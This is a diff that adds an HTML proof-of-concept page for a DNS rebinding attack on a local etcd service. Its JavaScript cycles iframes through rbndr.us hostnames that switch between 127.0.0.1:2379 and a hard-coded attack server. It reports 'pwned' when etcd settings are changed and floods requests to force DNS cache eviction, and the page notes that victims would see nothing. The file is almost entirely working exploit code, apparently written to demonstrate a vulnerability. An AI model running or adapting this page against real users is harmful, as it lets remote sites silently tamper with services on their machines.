@@ -1,0 +1,137 @@
+
+<html>
+<head>
+    <title>etcd DNS Rebinding Testcase</title>
+    <script>
+    var timerA;
+    var timerB;
+    var count = 0;
+
+    function convert_dotted_quad(addr)
+    {   
+        return addr.split('.')
+            .map(function (a) { return Number(a).toString(16) })
+            .map(function (a) { return a.length < 2 ? "0" + a : a })
+            .join('');
+    }
+
+    window.addEventListener("message", function (msg) {
+        console.log("message received from", msg.origin, msg.data.status);
+
+        if (msg.data.status == "start") {
+            console.log("iframe reports that attack has started");
+            if (msg.origin == document.getElementById("attackA").src.substr(0, msg.origin.length))
+                clearInterval(timerA);
+            if (msg.origin == document.getElementById("attackB").src.substr(0, msg.origin.length))
+                clearInterval(timerB);
+            msg.source.postMessage({cmd: "interval", param: document.getElementById("interval").value}, "*");
+            msg.source.postMessage({cmd: "start", param: null}, "*");
+        }
+        if (msg.data.status == "pwned") {
+            console.log("iframe reports that settings have been changed", msg.data.response);
+
+            attackA.contentWindow.postMessage({cmd: "stop"}, "*");
+            attackB.contentWindow.postMessage({cmd: "stop"}, "*");
+            clearInterval(timerA);
+            clearInterval(timerB);
+
+	    var f = document.getElementById("final"); 
+	    f.textContent = msg.data.response;
+	    f.style.color= "red";
+            alert("Attack Successful!");
+	
+        }
+    });
+
+    function reloadFrameA()
+    {
+        document.getElementById("attackA").src = document.getElementById("hosturl").value
+            .replace("%1", convert_dotted_quad(document.getElementById("hostA").value))
+            .replace("%2", convert_dotted_quad(document.getElementById("hostB").value))
+            + "?rnd=" + Math.random();
+    }
+
+    function reloadFrameB()
+    {
+        document.getElementById("attackB").src = document.getElementById("hosturl").value
+            .replace("%1", convert_dotted_quad(document.getElementById("hostB").value))
+            .replace("%2", convert_dotted_quad(document.getElementById("hostA").value))
+            + "?rnd=" + Math.random();
+    }
+
+    function begin()
+    {
+        message.style.display = "inline";
+        start.disabled = true;
+        timerA = setInterval(reloadFrameA, parseInt(document.getElementById("interval").value) * 1000);
+        timerB = setInterval(reloadFrameB, parseInt(document.getElementById("interval").value) * 1000);
+        reloadFrameA();
+        reloadFrameB();
+    }
+
+    function forceCacheEviction()
+    {
+        for (i = 0; i < 1000; i++) {
+            x = document.createElement("img");
+            x.src = document.getElementById("hosturl").value
+                .replace("%1", Number(0x7f000001).toString(16))
+                .replace("%2", Number(0x7f000001 + i).toString(16));
+            x.onerror = function () {
+                document.body.removeChild(this);
+            }
+            document.body.appendChild(x);
+        }
+    }
+    </script>
+</head>
+<body>
+<h3>etcd DNS Rebinding Testcase</h3>
+<p>
+Use <a href="https://lock.cmpxchg8b.com/rebinder.html">this</a> calculator to find rbndr hostnames.
+</p>
+<p>
+Note that this attack can take up to five minutes to work, this would be happening while you read a website in the background and you would see nothing on the screen.
+<br>
+This could be sped up with more frames (as you can see, this demo only uses two). Open the console (F12) to see debugging data.
+</p>
+<table>
+<tr>
+    <td>Rebinding Host URL</td>
+    <td>
+        <input id=hosturl value="http://%1.%2.rbndr.us:2379/attack_etcd.html" size=64>
+    </td>
+</tr>
+<tr>
+    <td>Rebinding Host A (etcd local)</td>
+    <td>
+        <input id=hostA value="127.0.0.1" size=64>
+    </td>
+</tr>
+<tr>
+    <td>Rebinding Host B (Attack Server)</td>
+    <td>
+        <input id=hostB value="35.205.198.70" size=64>
+    </td>
+</tr>
+<tr>
+    <td>How long to wait between attempts (seconds, 20 works best for chrome)</td>
+    <td>
+        <input id=interval value="20" size=64>
+    </td>
+</tr>
+</table>
+<p>
+<input onclick="begin()" id=start type=submit value="Start Attack">&nbsp;
+<input onclick="forceCacheEviction()" id=evict type=submit value="Force Cache Eviction" title="Try this if the attack is taking too long">
+</p>
+<p>
+<div id=message style="display:none">
+Please wait up to five minutes (Press F12 to see debug messages)... (We're waiting for DNS cache entries to expire).
+</div>
+<pre id=final>[ RESULT WILL SHOW HERE ]</pre>
+</p>
+<iframe id=attackA src="about:blank" height=128 width=50%></iframe>
+<iframe id=attackB src="about:blank" height=128 width=50%></iframe>
+</body>
+</html>
+
